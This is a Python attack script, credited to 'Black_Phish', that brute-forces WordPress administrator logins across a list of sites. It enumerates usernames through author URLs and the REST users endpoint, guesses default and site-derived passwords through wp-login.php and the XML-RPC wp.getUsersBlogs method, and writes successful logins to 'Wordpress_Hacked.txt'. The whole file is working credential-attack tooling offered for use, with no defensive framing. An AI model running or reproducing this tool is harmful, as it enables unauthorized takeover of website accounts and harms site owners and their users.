try:
	import requests,os,re,json
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except:
	print(" [+] Command: pip install requests")
	exit()
from platform import system
from threading import Thread
def clear():
	if system() == "Linux":
		os.system("clear")
	else:
		os.system("cls")
try:
	passlist = open("passwords.txt","r").read().splitlines()
except:
	passlist = ["admin","admin123","[SITE]","[DOMAIN]","[DOMAIN]123","[USER]","[USER]123"]
def passwords(site,user,passw):
	try:
		if "[SITE]" in passw:
			return passw.replace("[SITE]",site)
		elif "[UPPERLOGIN]" in passw:
			return passw.replace("[UPPERLOGIN]",user.upper())
		elif "[DOMAIN]" in passw:
			return passw.replace("[DOMAIN]",site.split(".")[0])
		elif "[USER]" in passw:
			return passw.replace("[USER]",user)
		else:
			return passw
	except Exception as e:
		print(e)
try:
	import concurrent.futures
	xxx = True
except:
	from multiprocessing.pool import ThreadPool
	xxx = False
def SpeedX(check,list,th):
	if xxx == True:
		try:
			with concurrent.futures.ThreadPoolExecutor(int(th)) as executor:
				executor.map(check,list)
		except Exception as e:
			pass
	else:
		pool = ThreadPool(int(th))
		pool.map(check,list)
		pool.close()
		pool.join()
red = '\x1b[31m'
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
def rez(url,exploit,n):
	if "|" in exploit:
		arr = exploit.split("|")
		if n == "1":
			print(w+" ["+g+"+"+w+"] "+g+arr[0]+": "+w+url+y+" | "+arr[1].strip()+" | "+arr[2].strip()+g+" [YES]")
		else:
			print(w+" ["+r+"+"+w+"] "+r+arr[0]+": "+w+url+y+" | "+arr[1].strip()+" | "+arr[2].strip()+r+" [NO]")
	else:
		if n == "1":
			print(w+" ["+g+"+"+w+"] "+g+exploit+": "+w+url+g+" [YES]")
		else:
			print(w+" ["+r+"+"+w+"] "+r+exploit+": "+w+url+r+" [NO]")
def Ret(x):
	try:
		return raw_input(x)
	except:
		return input(x)
logo = """   _____       _       _         _ _      __ ____ ____ ______ 
  / ____|     | |     | |       | (_)    /_ |___ \___ \____  |
 | (___   __ _| | __ _| |__   __| |_ _ __ | | __) |__) |  / / 
  \___ \ / _` | |/ _` | '_ \ / _` | | '_ \| ||__ <|__ <  / /  
  ____) | (_| | | (_| | | | | (_| | | | | | |___) |__) |/ /   
 |_____/ \__,_|_|\__,_|_| |_|\__,_|_|_| |_|_|____/____//_/                                                              """
class WpBrute:
	def __init__(self):
		self.userlist = ["admin"]
		self.headers = {}
		self.xmlrpc = False
	def get(self,url):
		sess = requests.session()
		send_requests = 0
		while True:
			if send_requests == 1:
				break
			try:
				return sess.get(url,headers=self.headers,timeout=15,verify=False)
			except:
				pass
			send_requests += 1
	def user_method_one(self,url):
		try:
			try:
				s = self.get(url)
			except:
				s = self.get(url)
			murl = s.url
			if not murl.endswith("/"):
				murl = murl+"/"
			find = re.findall('/author/(.*)/',murl)
			username = find[0]
			username = username.replace("-"," ")
			if username != "admin":
				self.userlist.append(username)
		except:
			pass
	def user_method_two(self,url):
		try:
			sess = requests.session()
			try:
				s2 = self.get(url)
			except:
				s2 = self.get(url)
			jn = json.loads(s2.content.decode("utf-8"))
			if 'id' not in str(jn):
				pass
			else:
				if str(jn['slug']) != "admin":
					self.userslist.append(str(jn['slug']))
		except:
			pass
	def get_users(self,site):
		if tool_config == True:
			if "admin" not in self.userlist:
				self.userlist.append("admin")
			return False
		sess = requests.session()
		thd = []
		for i in range(10):
			url = 'https://'+site+'/?author={}'.format(str(i + 1))
			th = Thread(target=self.user_method_one,args=(url,))
			th.start()
			thd.append(th)
		for th in thd:
			th.join()
		if not len(self.userlist) == 1:
			return 0
		thd = []
		for i in range(10):
			url = 'https://'+site+ '/index.php/wp-json/wp/v2/users/'+str(i + 1)
			th = Thread(target=self.user_method_two,args=(url,))
			th.start()
			thd.append(th)
		for th in thd:
			th.join()
	def WpLogin(self,site,username,passwd):
		passwd = passwords(site,username,passwd)
		try:
			data = {
				'log': username,
				'pwd': passwd,
				'wp-submit': 'wp-submit',
				'redirect_to': './wp-admin/',
				'testcookie': '1'
			}
			login = "https://"+site+"/wp-login.php"
			sess = requests.session()
			send_requests = 0
			while True:
				if send_requests == 1:
					break
				try:
					req = sess.post(login,data=data,headers=self.headers,timeout=10,verify=False).content.decode("utf-8")
					break
				except:
					pass
				send_requests += 1
			if "/wp-admin/" in req and ("/wp-login.php?action=logout" in req or "wordpress_logged_in" in str(sess.cookies) or "/wp-admin/profile.php" in req):
				rez(site,"Wordpress "+"| "+username+" | "+passwd,"1")
				with open('Wordpress_Hacked.txt', 'a') as writer:
					writer.write('https://'+site+ '/wp-login.php'+'\n Username: {}'.format(username)+'\n Password: '+passwd+'\n-----------------------------------------\n')
				return True
			else:
				rez(site,"Wordpress "+"| "+username+" | "+passwd,"b1")
				return "loginfailed"
		except Exception as e:
			pass
	def wp_detect(self,site):
		try:
			try:
				req = requests.get("https://"+site+"/wp-login.php",headers=self.headers,timeout=10,verify=False).content.decode("utf-8")
			except:
				req = requests.get("https://"+site+"/wp-login.php",headers=self.headers,timeout=10,verify=False).content.decode("utf-8")
			if "/wp-content/" in req or "/wp-login.php" in req or 'id="wp-submit"' in req:
				return True
			else:
				rez(site,"CMSDetect","1h")
				return "not"
		except:
			pass
	def check_xmlrpc(self,site):
		sess = requests.session()
		send_requests = 0
		while True:
			if send_requests == 11:
				break
			try:
				data = """<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>"""
				req = requests.post("https://"+site+"/xmlrpc.php",data=data,headers=self.headers,timeout=15,verify=False).content.decode("utf-8")
				if "<value><string>wp.getUsersBlogs</string></value>" in req:
					self.xmlrpc = True
				break
			except:
				pass
			send_requests +=1
	def xmlrpc_brute(self,site,username,password):
		password = passwords(site,username,password)
		try:
			payload = """<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>"""+username+"""</value></param> 
<param><value>"""+password+"""</value></param> 
</params> 
</methodCall>"""
			send_requests = 0
			while True:
				if send_requests == 11:
					break
				try:
					req = requests.post("https://"+site+"/xmlrpc.php",data=payload,headers=self.headers,timeout=15,verify=False).content.decode('utf-8')
					if "<string>XML-RPC services are disabled on this site.</string>" in req:
						return "disabled"
					if "<name>isAdmin</name>" in req or "<name>blogName</name>" in req or "<name>blogid</name>" in req:
						rez(site,"Wordpress "+"| "+username+" | "+password,"1")
						with open('Wordpress_Hacked.txt', 'a') as writer:
							writer.write('https://'+site+ '/wp-login.php'+'\n Username: {}'.format(username)+'\n Password: '+password+'\n-----------------------------------------\n')
						return True
					else:
						rez(site,"Wordpress "+"| "+username+" | "+password,"b1")
					break
				except:
					pass
				send_requests += 1
		except:
			pass
	def Brute(self,site,username):
		for password in passlist:
			if self.xmlrpc == True:
				req = self.xmlrpc_brute(site,username,password)
				if req == "disabled":
					break
				if req == True:
					break
			else:
				if self.WpLogin(site,username,password) == True:
					break
	def Run(self,site):
		site = site.replace("http://","").replace("https://","")
		self.headers = {
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate',
			'Referer': 'https://{}'.format(site),
			'Content-Type': 'application/x-www-form-urlencoded',
			'Origin': 'https://{}'.format(site),
			'Connection': 'keep-alive',
			'Upgrade-Insecure-Requests': '1',
			'Sec-Fetch-Dest': 'document',
			'Sec-Fetch-Mode': 'navigate',
			'Sec-Fetch-Site': 'same-origin',
			'Sec-Fetch-User': '?1'
		}
		if(self.wp_detect(site)):
			self.check_xmlrpc(site)
			self.get_users(site)
			thd = []
			for username in self.userlist:
				th = Thread(target=self.Brute,args=(site,username))
				th.start()
				thd.append(th)
			for th in thd:
				th.join()
clear()
print(r+logo+"""\n{}	Author:{} Black_Phish\n	{}Chose : {}Wp Deafult Login\n	{}Chose : {}Wp Grab Username Login\n""".format(y,c,m,w,g,w))
cmd = Ret(g+" >>"+w+":"+c+"~"+m+"# "+r)
if cmd == "1":
	tool_config = True
	try:
		passlist = open("default.wp","r").read().splitlines()
	except:
		passlist = ["admin","admin123","123456","admin@admin","admin@123","admin12345","admin12345","admin@12345","password","password123","12345678","1234567890","101010","12341234"]
else:
	tool_config = False
clear()
print(r+logo+"""\n{}	Author:{} Black_Phish\n	{}Name: {}Wp Login & Xmlrpc BruteForce\n	{}Msg: {}Tool is too slow\n""".format(y,c,y,c,y,c))
try:
	dorks = Ret(g+" EnterList"+w+":"+c+"~"+m+"# "+r)
	th = Ret(g+" Thread"+w+":"+c+"~"+m+"# "+r)
	dork = open(dorks,"r").read().splitlines()
except Exception as e:
	pass
	exit()
obj = WpBrute()
SpeedX(obj.Run,dork,th)